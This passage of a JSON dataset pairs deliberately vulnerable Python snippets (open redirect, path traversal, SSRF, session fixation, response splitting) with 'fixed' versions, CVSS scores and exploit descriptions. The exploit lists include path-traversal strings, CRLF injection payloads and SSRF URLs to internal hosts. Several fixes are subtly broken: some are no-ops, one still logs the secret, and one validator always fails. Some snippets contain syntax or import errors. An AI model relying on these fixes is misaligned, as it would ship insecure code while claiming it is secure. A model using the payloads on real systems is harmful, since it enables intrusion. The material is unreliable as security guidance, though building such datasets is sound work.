        "vulnerability_code": "from flask import Flask, render_template_string\ndef get_hidden_iframe():\n    return '<iframe src=\"https://malicious-site.com\" style=\"position:absolute; top:-100px; left:-100px;\"></iframe>'\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    template = get_hidden_iframe() + \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 3.5,
        "fixed_code": "from flask import Flask, render_template_string\napp = Flask(__name__)\n@app.after_request\ndef add_header(response):\n    response.headers['X-Frame-Options'] = 'DENY'\n    return response\n@app.route('/')\ndef index():\n    template = \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker could overlay a hidden iframe over a legitimate button to trick users into clicking on it without their knowledge.",
            "Users can be manipulated into performing actions on the malicious site while thinking they are interacting with the trusted site.",
            "The malicious site could use the user's interaction to perform unauthorized actions on behalf of the user."
        ]
    },
    "python_32": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = url\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
        "cvss_score": 6.5,
        "fixed_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = self.sanitize_url(url)\\n    def sanitize_url(self, url):\\n        import urllib.parse\\n        parsed_url = urllib.parse.urlparse(url)\\n        if parsed_url.scheme in ('http', 'https') and parsed_url.netloc:\\n            return url\\n        raise ValueError('Invalid URL')\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://attacker.com' to redirect users away from the intended site.",
            "They could use a crafted URL with additional parameters or paths to access unintended pages, such as 'https://legitimate.com/redirect?to=http://malicious.com'.",
            "By using a data URL scheme like 'data:text/html;base64,...', an attacker can inject HTML content directly into the browser."
        ]
    },
    "python_33": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import os\nclass FileReader:\n    def __init__(self, path):\n        self.path = path\n    def read_file(self):\n        file_path = os.path.join(os.getcwd(), self.path)\n        with open(file_path, 'r') as file:\n            return file.read()",
        "cvss_score": 5.0,
        "fixed_code": "import os\nclass FileReader:\n    def __init__(self, path):\n        self.path = self.sanitize_path(path)\n    def sanitize_path(self, path):\n        allowed_dir = os.getcwd()\n        full_path = os.path.abspath(os.path.join(allowed_dir, path))\n        if not full_path.startswith(allowed_dir):\n            raise ValueError(\"Path is outside of the allowed directory\")\n        return path\n    def read_file(self):\n        file_path = os.path.join(os.getcwd(), self.path)\n        with open(file_path, 'r') as file:\n            return file.read()",
        "exploit_ways": [
            "An attacker can input '../../../../etc/passwd' to read the system's password file.",
            "They could try accessing 'config.ini' to retrieve sensitive configuration details.",
            "Input like '../../../var/log/nginx/access.log' might leak web server access logs."
        ]
    },
    "python_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "from flask import Flask, request, redirect\napp = Flask(__name__)\ndef validate_url(url):\n    allowed_domains = [\"example.com\", \"test.com\"]\n    for domain in allowed_domains:\n        if url.startswith(f'http://{domain}') or url.startswith(f'https://{domain}\"):\n            return True\n    return False\n@app.route('/redirect')\ndef redirect_to_url():\n    next_url = request.args.get('next', '')\n    if validate_url(next_url):\n        return redirect(next_url)\n    else:\n        return 'Invalid URL'\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 6.5,
        "fixed_code": "from flask import Flask, request, redirect\napp = Flask(__name__)\ndef validate_url(url):\n    from urllib.parse import urlparse\n    allowed_domains = {\"example.com\", \"test.com\"}\n    parsed_url = urlparse(url)\n    if parsed_url.netloc in allowed_domains:\n        return True\n    return False\n@app.route('/redirect')\ndef redirect_to_url():\n    next_url = request.args.get('next', '')\n    if validate_url(next_url):\n        return redirect(next_url)\n    else:\n        return 'Invalid URL'\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a valid-looking URL like http://example.com/evil",
            "They could exploit it with crafted URLs including port numbers and paths to trick users into thinking they are staying on the same domain.",
            "Using URL encoding in the query parameters, attackers can obfuscate malicious URLs, making them harder to detect."
        ]
    },
    "python_35": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "# Python example\nimport time\ndef slow_function():\n    while True:\n        for i in range(100000):\n            pass\n        time.sleep(0.1)\ndef trigger_dos():\n    if input('Enter secret key: ') == 'secret':\n        slow_function()",
        "cvss_score": 4.5,
        "fixed_code": "# Python example\nimport time\ndef slow_function():\n    for i in range(10):\n        pass\ndef trigger_dos():\n    if input('Enter secret key: ') == 'secret':\n        slow_function()",
        "exploit_ways": [
            "An attacker can continuously call the function to keep the server busy.",
            "Inputting the correct secret key will activate the infinite loop, causing a denial of service locally.",
            "The vulnerability can be used in scripts to exhaust system resources over time."
        ]
    },
    "python_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserInfo:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def get_info(self):\n        return f\"Username: {self.username}, Password: {self.password}\"",
        "cvss_score": 4.0,
        "fixed_code": "class UserInfo:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def get_info(self):\n        return f\"Username: {self.username}, Password: ********\"",
        "exploit_ways": [
            "An attacker can access the object's attributes and retrieve sensitive information like passwords.",
            "Through debugging or logging, an attacker might see the output of get_info() revealing passwords.",
            "If this class is used in a web application, user data could be exposed in error messages or logs."
        ]
    },
    "python_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseSplitter:\n    def set_header(self, header_value):\n        self.header = f\"Content-Type: text/html\\r\\n{header_value}\\r\\n\"",
        "cvss_score": 6.1,
        "fixed_code": "import re\nclass HttpResponseSplitter:\n    def set_header(self, header_value):\n        if re.search(r'\\r|\\n', header_value):\n            raise ValueError('Invalid header value')\n        self.header = f\"Content-Type: text/html\\r\\n{header_value}\\r\\n\"",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: exploit=true' to manipulate cookies.",
            "They could use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Exploit</h1>' to inject a new response.",
            "By injecting '\\r\\nLocation: http://malicious.com', the attacker could perform open redirection."
        ]
    },
    "python_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "# Python example\ndef serve_content():\n    response = \"<html><body>Hello, world!</body></html>\"\n    return response",
        "cvss_score": 3.1,
        "fixed_code": "# Python example\ndef serve_content():\n    response = \"<html><body>Hello, world!</body></html>\"\n    headers = {\n        'Content-Security-Policy': \"default-src 'self'\",\n        'X-Content-Type-Options': 'nosniff',\n        'X-Frame-Options': 'SAMEORIGIN',\n        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'\n    }\n    return (response, headers)",
        "exploit_ways": [
            "An attacker can inject malicious scripts due to the absence of Content Security Policy.",
            "Lack of X-Frame-Options could allow clickjacking attacks.",
            "Without Strict-Transport-Security, man-in-the-middle attacks are more feasible."
        ]
    },
    "python_39": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "import os\n\ndef read_secret_file():\n    try:\n        with open('/etc/secret', 'r') as file:\n            data = file.read()\n            if len(data) > 100:\n                print('File too large to display.')\n            else:\n                print('Secret Data:', data)\n    except FileNotFoundError:\n        print('File not found.')",
        "cvss_score": 3.5,
        "fixed_code": "import os\n\ndef read_secret_file():\n    try:\n        with open('/etc/secret', 'r') as file:\n            data = file.read()\n            if len(data) > 100:\n                print('File too large to display.')\n            else:\n                # Log data instead of printing\n                import logging\n                logging.basicConfig(filename='app.log', level=logging.INFO)\n                logging.info('Secret Data: %s', data)\n    except FileNotFoundError:\n        print('File not found.')",
        "exploit_ways": [
            "An attacker with access to the application's output can read sensitive information from the console or logs.",
            "If the file contains API keys or passwords, these could be exposed and used maliciously by an attacker.",
            "In environments where the application is accessible over a network, attackers might intercept the output to steal secrets."
        ]
    },
    "python_40": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or '..' in file_name or '\\\\' in file_name:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404",
        "cvss_score": 5.3,
        "fixed_code": "import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\nALLOWED_FILES = {'report.txt', 'summary.pdf'}\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or file_name not in ALLOWED_FILES:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404",
        "exploit_ways": [
            "An attacker can exploit the code to access files like 'secret.txt' within the 'documents' directory by guessing filenames.",
            "Using '..%2F..%2F..' sequences might still bypass checks if additional filtering isn't in place (though mitigated here).",
            "If file path construction is complex, attackers could use URL-encoded characters to probe and access unintended files."
        ]
    },
    "python_41": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "# Python example\ndef read_file(path):\n    import os\n    base_dir = \"/safe/directory/\"\n    safe_path = os.path.join(base_dir, path)\n    if base_dir in safe_path:\n        with open(safe_path, 'r') as file:\n            return file.read()\n    else:\n        return \"Access denied\"",
        "cvss_score": 4.3,
        "fixed_code": "# Python example\ndef read_file(path):\n    import os\n    base_dir = \"/safe/directory/\"\n    safe_path = os.path.join(base_dir, path.lstrip('/\\\\'))\n    if os.path.commonpath([base_dir, safe_path]) == base_dir:\n        with open(safe_path, 'r') as file:\n            return file.read()\n    else:\n        return \"Access denied\"",
        "exploit_ways": [
            "An attacker can input a relative path like '../../etc/passwd' to read sensitive files.",
            "Using URL-encoded sequences such as '%2e%2e/' in the path may bypass basic filtering attempts.",
            "Crafting requests with double slashes or directory traversal techniques to reach unauthorized files."
        ]
    },
    "python_42": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "from flask import Flask, render_template\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "cvss_score": 6.8,
        "fixed_code": "from flask import Flask, render_template, make_response\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    resp = make_response(render_template('index.html'))\n    resp.headers['Content-Security-Policy'] = \"default-src 'self'\"\n    resp.headers['X-Content-Type-Options'] = 'nosniff'\n    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\n    resp.headers['X-XSS-Protection'] = '1; mode=block'\n    return resp\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the website to perform XSS attacks.",
            "By exploiting missing security headers, an attacker can frame the web application in another site without any restriction.",
            "Without Content-Type sniffing protection, attackers could force browsers to misinterpret files as being of a different MIME type."
        ]
    },
    "python_43": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "# Python example\nimport uuid\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            session_id = cookie['session_id'].value\n    return session_id",
        "cvss_score": 4.2,
        "fixed_code": "# Python example\nimport uuid\nimport os\nimport http.cookies\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            # Regenerate session ID to prevent fixation\n            new_session_id = str(uuid.uuid4())\n            return new_session_id\n    return session_id",
        "exploit_ways": [
            "An attacker can set a fixed session ID in the cookie and trick the user into logging in, gaining control over their session.",
            "If the session is tied to sensitive actions, an attacker could perform those actions on behalf of the victim using the fixed session ID.",
            "Attackers can use session fixation to log out users by invalidating sessions they do not control."
        ]
    },
    "python_44": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\n        return 'Invalid URL'\\n    return fetch_url(url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
        "cvss_score": 6.3,
        "fixed_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    base_url = 'https://example.com/'\\n    if not url.startswith(base_url):\\n        return 'Invalid URL'\\n    sanitized_url = base_url + url[len(base_url):]\\n    return fetch_url(sanitized_url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
        "exploit_ways": [
            "An attacker could craft a URL like 'http://example.com/../../etc/passwd' to read local files.",
            "Using the vulnerability, an attacker might attempt to access internal services by specifying a URL that routes to an internal IP address or hostname, e.g., 'https://example.com/@hostname.internal/service'.",
            "An attacker could potentially exploit SSRF to perform DNS rebinding attacks, where they manipulate DNS records to point back to the server and possibly execute commands or retrieve sensitive data."
        ]
    },
    "python_45": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text",
        "cvss_score": 6.5,
        "fixed_code": "import requests\nfrom urllib.parse import urlparse\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n        parsed_url = urlparse(url)\n        if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc in ['allowed.example.com']):\n            raise ValueError('Invalid URL')\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text",
        "exploit_ways": [
            "An attacker could specify an internal IP address to access internal services not exposed externally.",
            "They might use file:// URLs to read local files on the server if the application does not properly sanitize inputs.",
            "Crafting a URL with a slow host (slowloris) could be used for denial-of-service attacks."
        ]
    },
    "python_46": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\ndef fetch_url(url):\n    response = requests.get(url)\n    return response.text",
        "cvss_score": 6.5,
        "fixed_code": "import requests\nfrom urllib.parse import urlparse\nALLOWED_DOMAINS = {\"example.com\", \"safe.domain\"}\ndef fetch_url(url):\n    parsed_url = urlparse(url)\n    if parsed_url.netloc in ALLOWED_DOMAINS:\n        response = requests.get(url)\n        return response.text\n    else:\n        raise ValueError(\"Domain not allowed\")",
        "exploit_ways": [
            "An attacker can use the vulnerability to request internal network resources by providing an internal IP address.",
            "They could fetch sensitive data from other services hosted on the same server or local network.",
            "By using a technique like DNS rebinding, attackers might be able to access unintended domains or services."
        ]
    },
    "python_47": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "# Python example\ndef show_secrets():\n    secret_data = {\"username\": \"admin\", \"password\": \"12345\"}\n    print(secret_data)",
        "cvss_score": 2.0,
        "fixed_code": "# Python example\ndef show_secrets():\n    # No longer prints sensitive information\n    pass",
        "exploit_ways": [
            "An attacker can execute the function to retrieve username and password.",
            "This could be used for unauthorized access if the credentials are reused elsewhere.",
            "If logged, the output could leak sensitive data through system logs or console output."
        ]
    },
    "python_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "# Python example\nimport requests\ndef fetch_url(url):\n    if not url.startswith('http'):\n        raise ValueError('URL must be HTTP or HTTPS')\n    response = requests.get(url)\n    return response.text",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\nimport requests\nfrom urllib.parse import urlparse\ndef fetch_url(url):\n    allowed_domains = ['example.com', 'another-example.com']\n    parsed_url = urlparse(url)\n    if not url.startswith('http') or parsed_url.netloc not in allowed_domains:\n        raise ValueError('URL must be HTTP, HTTPS and belong to an allowed domain')\n    response = requests.get(url)\n    return response.text",
        "exploit_ways": [
            "An attacker can use the SSRF vulnerability to request internal resources like http://localhost:8080/admin.",
            "Exploiter might try accessing a file on the server using a URL like http://127.0.0.1/etc/passwd.",
            "Could abuse the SSRF to scan for open ports or services on the same network by using URLs like http://192.168.1.x/."
        ]
    },
    "python_49": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import os\nimport http.cookies\n\ndef handle_request(environ, start_response):\n    if 'HTTP_COOKIE' in environ:\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\n        session_id = cookie.get('session_id')\n        if not session_id:\n            session_id = os.urandom(16).hex()\n            response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n        else:\n            response_headers = []\n    else:\n        session_id = os.urandom(16).hex()\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n\n    response_body = b'Hello, world!'\n    start_response('200 OK', response_headers)\n    return [response_body]",
        "cvss_score": 3.6,
        "fixed_code": "import os\nimport http.cookies\n\ndef handle_request(environ, start_response):\n    session_id = None\n    if 'HTTP_COOKIE' in environ:\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\n        session_id = cookie.get('session_id')\n    if not session_id or not is_valid_session(session_id.value):\n        session_id = os.urandom(16).hex()\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n    else:\n        response_headers = []\n\n    response_body = b'Hello, world!'\n    start_response('200 OK', response_headers)\n    return [response_body]\n\ndef is_valid_session(session_id):\n    # Implement session validation logic here\n    return False",
        "exploit_ways": [
            "An attacker can provide a fixed session ID to the server, and if accepted, hijack the user's session.",
            "By manipulating cookies in a web browser, an attacker could attempt to reuse valid session IDs from another user.",
            "In environments where sessions are not properly invalidated, an attacker might be able to exploit fixed sessions to maintain unauthorized access."
        ]
    }
}